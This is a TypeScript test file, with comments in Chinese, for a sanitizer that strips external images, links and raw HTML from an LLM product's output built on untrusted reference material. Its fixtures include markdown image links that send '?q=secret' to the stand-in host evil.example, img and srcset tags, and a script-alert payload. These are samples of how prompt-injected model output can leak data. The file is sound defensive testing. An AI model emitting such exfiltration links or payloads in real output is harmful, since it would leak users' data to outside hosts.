import { createRequire } from 'node:module'
import { render } from '@testing-library/react'
import { describe, expect, it } from 'vitest'

const require = createRequire(import.meta.url)

function setPageUrl(href: string): string {
  // jsdom 不實作跨來源導覽。改文件的 URL，window.location.hostname 才會跟著變。
  const { implForWrapper } = require('jsdom/lib/jsdom/living/generated/utils')
  const whatwgURL = require('whatwg-url')
  const document = implForWrapper(window.document)
  const url = whatwgURL.parseURL(href)
  const previous = whatwgURL.serializeURL(document._URL)
  document._URL = url
  document._origin = whatwgURL.serializeURLOrigin(url)
  return previous
}

import { MarkdownPreview } from '../components/MarkdownPreview'
import { INJECTION_NOTICE, isPlatformUrl, neutralizeUntrustedMarkdown } from './untrustedOutput'

describe('ANILA LM 外連', () => {
  it('非平台圖片不會留成可載入的 markdown', () => {
    const text = neutralizeUntrustedMarkdown('![x](http://evil.example/?q=secret)')
    expect(text).not.toContain('![x](')
    expect(text).not.toContain('](http://evil.example')
    expect(text).toContain('evil.example')
    expect(isPlatformUrl('/api/ingestion/images/1/blob')).toBe(true)
  })

  it('預覽不會把外連畫成 img 或 a', () => {
    const { container } = render(
      <MarkdownPreview markdown={'看 ![x](http://evil.example/?q=secret) 與 [點此](http://evil.example/x)'} />,
    )
    expect(container.querySelector('img')).toBeNull()
    expect(container.querySelector("a[href*='evil.example']")).toBeNull()
    expect(container.textContent).toContain('evil.example')
  })

  it('較長圍欄與原始 HTML 都不會載入外站', () => {
    const fenced = neutralizeUntrustedMarkdown(
      '````\n```\ninside\n````\n![x](http://evil.example/?q=secret)',
    )
    expect(fenced).not.toContain('![x](')
    expect(fenced).toContain('inside')
    const html = neutralizeUntrustedMarkdown(
      '<img src="//evil.example/?q=資料"> <img srcset="//evil.example/a 1x"> &#60;img src="//evil.example/?q=資料"&#62;',
    )
    expect(html.toLowerCase()).not.toContain('<img')
    expect(html).not.toContain('&#60;')
    expect(isPlatformUrl('data:text/html,hi')).toBe(false)
    expect(isPlatformUrl('blob:https://evil.example/1')).toBe(false)
    const { container } = render(
      <MarkdownPreview markdown={'<img src="//evil.example/?q=資料"> ![x](data:image/png;base64,AAAA)'} />,
    )
    expect(container.querySelector('img')).toBeNull()
    expect(container.querySelector("a[href*='evil.example']")).toBeNull()
  })

  it('頁面自己的主機算平台，別台的實驗 IP 不算', () => {
    const previous = setPageUrl('https://anila.intranet.example/anilalm/')
    try {
      expect(window.location.hostname).toBe('anila.intranet.example')
      expect(isPlatformUrl('https://anila.intranet.example/anilalm/')).toBe(true)
      expect(isPlatformUrl('http://ANILA.INTRANET.EXAMPLE/app')).toBe(true)
      expect(isPlatformUrl('/api/ingestion/images/1/blob')).toBe(true)
      expect(isPlatformUrl('https://kb.ncsist.org.tw/doc')).toBe(true)
      expect(isPlatformUrl('http://10.53.100.12/app')).toBe(false)
      expect(isPlatformUrl('http://172.16.120.35/app')).toBe(false)
      expect(isPlatformUrl('http://172.16.120.153/app')).toBe(false)
      expect(isPlatformUrl('http://localhost/app')).toBe(false)
      const kept = neutralizeUntrustedMarkdown('![圖](https://anila.intranet.example/a.png)')
      expect(kept).toContain('![圖](https://anila.intranet.example/a.png)')
      const dropped = neutralizeUntrustedMarkdown('![x](http://10.53.100.12/a.png)')
      expect(dropped).not.toContain('![x](')
    } finally {
      setPageUrl(previous)
    }
  })

  it('回覆詳情的句子固定', () => {
    expect(INJECTION_NOTICE).toBe('參考資料中有疑似指令，已忽略')
  })
})

describe('不是標籤開頭的小於號', () => {
  it('x < 5 與 y <= 3 原樣保留，<script 仍被擋', async () => {
    const { neutralizeUntrustedMarkdown } = await import('./untrustedOutput')
    const out = neutralizeUntrustedMarkdown('x < 5 且 y <= 3，<script>alert(1)</script>')
    expect(out).toContain('x < 5')
    expect(out).toContain('y <= 3')
    expect(out).not.toContain('<script')
  })
})
